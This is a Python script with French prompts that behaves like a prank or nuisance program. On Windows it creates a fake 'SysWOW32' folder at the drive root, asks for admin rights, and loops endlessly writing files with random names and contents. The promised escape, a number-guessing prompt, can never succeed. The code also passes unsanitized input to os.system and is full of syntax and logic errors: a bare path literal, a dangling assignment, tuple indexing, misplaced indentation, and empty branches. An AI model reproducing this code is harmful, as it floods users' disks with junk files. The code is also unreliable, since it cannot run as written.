import time, os, platform, pygame, turtle, random
alphabet=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","é","ê","è","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
alphabett=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","é","ê","è","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","\n","ï","Ï","ö","Ö","Ä","ä","ë","Ë","Ü","ü","ÿ","â","Â","Î","î","û","Û","ô","Ô","ù","à","À","Ù","ì","Ì","ò","Ò","ã","Ã","õ","Õ"]
color=
alphabet[random.randint(0, 52)]
if platform.system()=="Windows":
    def T(Z):
        os.system("title {}".format(Z))
    def Cr(fol):
        os.system("mkdir {}".format(fol))
    def COLOR(w,b):
        os.system("color {}{}".format(b,w))
    def START(file):
        try:
            os.system("start {}".format(file))
        except:
            name="Failed"
            name+=alphabet[random.randint(0, 52)]
            form=alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)]
            file+="\nFailed"
            f=open("{}.{}".format(name,form), "a")
            s=f.write(file)
            f.close()
            print("Failed")
    def Cmd(file):
        try:
            os.system("cmd/c {}".format(file))
        except:
            name="Failed"
            name+=alphabet[random.randint(0, 52)]
            form=alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)]
            file+="\nFailed"
            f=open("{}.{}".format(name,form), "a")
            s=f.write(file)
            f.close()
            print("Failed")
    def Create(randnam, randform, randcont):
        file,l=0,0
        while randcont<l:
            file+=alphabett[random.randint(0, 86)]
        f=open("{}.{}".format(randnam,randform), "a")
        s=f.write(file)
        f.close()
    def Clear():
        os.system("cls")
    def G(f):
        os.system("cd {}".format(f))
    G(..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..)
    os.system("echo off")
    try:
        Cr(SysWOW32)
        G(SysWOW32)
    except:
        print ("Give me admin writes")
        Cr(coucou)
    COLOR(0,A)
    Clear()
    while s!=-1:
        main=random.randint(0,1346)
        if main==0:
            ddd=input("Trouvez le bon nombre pour arrêter le programme:")
            if ddd==-1:
                print("Bravo vous avez trouvé.")
                sleep(2)
                s=-1
            else:
                print("Raté, la chance vous souriera peut-être la prochaine fois.")
        if main==1:
            Create(alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)],alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)],random.randint(0, 9999))
        
        else:
        Create(alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)],alphabet[random.randint(0, 52),random.randint(0, 52),random.randint(0, 52)],random.randint(0, 9999))
elif platform.system()=="Linux":

else:
